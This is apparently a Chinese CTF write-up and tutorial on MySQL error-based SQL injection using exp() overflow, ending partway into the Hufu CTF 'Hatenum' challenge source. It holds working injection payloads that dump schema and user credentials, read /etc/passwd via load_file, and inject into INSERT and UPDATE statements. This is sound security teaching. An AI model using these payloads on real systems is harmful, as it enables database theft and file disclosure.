## 前言
前段时间做 2021 虎符杯 CTF Finalweb Hatenum 这道题时学到了使用 MySQL exp()
函数进行注入的新姿势，这里系统的总结一下。话不多少，开搞！
## MySQL exp() 函数
MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 ...)是自然对数的底数。
    EXP(X)
该函数返回E的X次方后的值，如下所示：
    mysql> select exp(3);
    +--------------------+
    | exp(3)             |
    +--------------------+
    | 20.085536923187668 |
    +--------------------+
    1 row in set (0.00 sec)
    mysql>
该函数可以用来进行 MySQL 报错注入。但是为什么会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 MySQL 能记录的 Double
数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误：
    mysql> select exp(709);                                       
    +-----------------------+                                     
    | exp(709)              |                                     
    +-----------------------+                                     
    | 8.218407461554972e307 |                                     
    +-----------------------+                                     
    1 row in set (0.00 sec)                                       
    mysql> select exp(710);                                       
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
    mysql>
除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。
## 使用 exp() 函数进行报错注入
  * 使用版本：MySQL5.5.5 及以上版本
现在我们已经知道当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误。那么我们在实际利用中如何让 exp()
报错的同时返回我们想要得到的数据呢？
我们可以用 `~` 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的
Double 数组范围，从而报错输出：
    mysql> select ~(select version());
    +----------------------+
    | ~(select version())  |
    +----------------------+
    | 18446744073709551610 |
    +----------------------+
    1 row in set, 1 warning (0.00 sec)
    mysql> select exp(~(select * from(select version())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.29' from dual)))'
    mysql> select exp(~(select * from(select user())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
    mysql> select exp(~(select * from(select database())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'ctf' from dual)))'
    mysql>
如上图所示，成功报错并输出了数据。但是事实证明，在 MySQL>5.5.53 之后，exp() 报错不能返回我们的查询结果，而只会得到一个报错：
而在脚本语言中，就会将这些错误中的一些表达式转化成相应的值，从而爆出数据。
### 注出数据
  * 得到表名：
    mysql> select exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'flag,users' from dual)))'
    mysql>
  * 得到列名：
    mysql> select exp(~(select*from(select group_concat(column_name) from information_schema.columns where table_name='users')x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'id,username,password' from dual)))'
    mysql>
  * 检索数据：
    mysql> select exp(~ (select*from(select group_concat(id, 0x7c, username, 0x7c, password) from users)x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '1|admin|123456,2|whoami|657260,3|bunny|864379' from dual)))'
    mysql>
  * 读取文件（有13行的限制）：
    mysql> select exp(~(select * from(select load_file('/etc/passwd'))x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' from dual)))'
### 一蹴而就
这个查询可以从当前的上下文中 dump 出所有的 tables 与 columns，我们也可以 dump
出所有的数据库，但由于我们是通过一个错误进行提取，它会返回很少的结果：
    mysql> select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
    ctf::flag::id
    ctf::flag::flag
    ctf::users::id
    ctf::users::username
    ctf::users::password' from dual)))'
    mysql>
### Injection in Insert
根据 Insert 位置的注入方式按部就班就好了。假设原来的插入语句如下：
    insert into users(id,username,password) values(4,'john','679237');
我们可以在 username 或 password 位置插入恶意的 exp() 语句进行报错注入，如下所示：
    # 在username处插入: john' or exp(~(select * from(select user())x)),1)#, 则sql语句为: insert into users(id,username,password) values(4,'john' or exp(~(select * from(select user())x)),1)#','679237');
    mysql> insert into users(id,username,password) values(4,'john' or exp(~(select * from(select user())x)),1);#','679237');;
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
    mysql>
爆出所有数据：
    # 在username处插入: john' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1)#
    mysql> insert into users(id,username,password) values(4,'john' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#','679237');
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
    ctf::flag::id
    ctf::flag::flag
    ctf::users::id
    ctf::users::username
    ctf::users::password' from dual)))'
    mysql>
### Injection in Update
根据 Update 位置的注入方式按部就班就好了。假设原来的插入语句如下：
    update users set password='new_value' WHERE username = 'admin';
我们可以在 new_value 或后面的 where 子句处插入恶意的 exp() 语句进行报错注入，如下所示：
    # 在new_value处插入: abc' or exp(~(select * from(select user())x))#, 则sql语句为: update users set password='abc' or exp(~(select * from(select user())x))# WHERE username = 'admin';
    mysql> update users set password='abc' or exp(~(select * from(select user())x));# WHERE username = 'admin';
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
    mysql>
## 使用 exp() 函数进行盲注
有的登录逻辑会根据 sql 语句的报错与否返回不同的结果，如果我们可以控制这里得报错的话便可以进行盲注。下面我们通过一个 CTF 例题来进行详细探究。
### 2021 虎符杯 CTF Finalweb Hatenum
进入题目是一个登录页面：
题目给出了源码：
  * home.php
登录进去便能得到flag。
  * login.php
    login($_POST['username'],$_POST['password'],$_POST['code'])) {
            case 'success':
                echo 'login success';
                header('location:home.php');
                break;
            case 'fail':
                echo 'login fail';
                header('location:index.php');
                break;
            case 'error':
                echo 'error';
                header('location:index.php');
                break;
        }
    }
    else{
        die('no use');
    }
    ?>
  * config.php
    <?php
    error_reporting(0);
    session_start();
    class User{
        public $host = "localhost";